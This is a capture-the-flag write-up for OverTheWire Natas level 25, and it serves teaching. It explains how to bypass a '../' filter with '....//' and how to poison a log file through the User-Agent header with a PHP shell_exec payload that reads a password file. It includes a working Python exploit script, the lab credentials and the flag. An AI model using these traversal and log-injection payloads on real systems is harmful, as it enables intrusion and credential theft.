# Natas Level 25 Writeup (natas25) – OverTheWire

## Overview

This level focuses on exploiting a **path traversal and log poisoning** vulnerability.   
The goal is to find the password for the next level.

## Observation

When we open the page, we see a language selection:

> **"Choose language:"**

There is also a link to view the source code:

```text
index-source.html
```

## Finding the Password

### Using Browser & BurpSuite

1. Open the source code.

2. The application uses the `lang` parameter to include a language file:

   ```php
   safeinclude("language/" . $_REQUEST["lang"]);
   ```

3. The application tries to prevent directory traversal:

   ```php
   if(strstr($filename,"../")){
       $filename=str_replace("../","",$filename);
   }
   ```

4. We can bypass this filter using:

   ```text
   ....//
   ```

   After `../` is removed, it becomes:

   ```text
   ../
   ```

5. The application also logs the `User-Agent` header into a log file.

6. We can inject PHP code into the `User-Agent`:

   ```php
   <?php echo shell_exec("cat /etc/natas_webpass/natas26");?>
   ```

7. Then use the path traversal bypass to include our session log file.

8. Payload used:

   ```text
   // use natas25_<PHPSESSID>.log
   ....//logs/natas25_alr8a7i54c649l24nre14qfqhd.log
   ```

9. The injected PHP code is executed when the log file is included, revealing the password for **natas26**.

#### Proof

```text
[24.08.2026 12::10:58] 3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT
"Directory traversal attempt! fixing request."
```

### Using Python

```python
import requests, re

target = 'http://natas25.natas.labs.overthewire.org'
session = requests.session()
session.auth = ('natas25', 'UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo')

session.get(target)

sessid = session.cookies.get('PHPSESSID')
print("PHPSESSID is:", sessid)

payload = '<?php echo shell_exec("cat /etc/natas_webpass/natas26");?>'

# only 
session.get(target, params={'lang': '....//test'}, headers={'User-Agent': payload})

lang = f"....//logs/natas25_{sessid}.log"
r = session.get(target, params={'lang': lang})

match = re.search(r'\s(\w{32})', r.text)
print("Password for next level is:", match.group(1))
```

## Vulnerability

The application tries to block `../`, but the filter can be bypassed using `....//`.

It also stores the `User-Agent` in a log file and later includes that file as PHP.

By injecting PHP code into the log and then including it, we can execute the code and read the password.

## Flag

`3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT`
